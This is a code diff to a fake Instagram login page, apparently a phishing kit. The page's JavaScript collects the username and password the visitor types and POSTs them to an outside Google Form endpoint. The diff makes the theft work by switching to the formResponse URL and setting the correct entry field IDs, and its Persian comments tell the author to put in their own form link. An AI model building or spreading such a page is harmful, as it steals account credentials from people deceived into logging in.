@@ -50,7 +50,7 @@
 <body>
 
 <div class="container">
-  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Picture" class="logo">
+  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
   
   <form id="loginForm">
     <input type="text" id="username" placeholder="Phone number, username, or email" required />
@@ -75,12 +75,12 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     return;
   }
 
-  // ←←← اینجا لینک Google Form خودت را بذار
-  const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfu-mXfWLScdqkxSDZw1bfzyF5FCChckYRarjfWyNI3op9ukQ/viewform?usp=pp_url&entry.273588529=test@gmail.com&entry.707204198=123456";
+  // لینک فرم Response تو
+  const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfu-mXfWLScdqkxSDZw1bfzyF5FCChckYRarjfWyNI3op9ukQ/formResponse";
 
   const formData = new FormData();
-  formData.append("test@gmail.com", username);   // شماره entry Username را عوض کن
-  formData.append("123456", password);   // شماره entry Password را عوض کن
+  formData.append("entry.273588529", username);   // Username field
+  formData.append("entry.707204198", password);   // Password field
 
   fetch(formUrl, {
     method: 'POST',
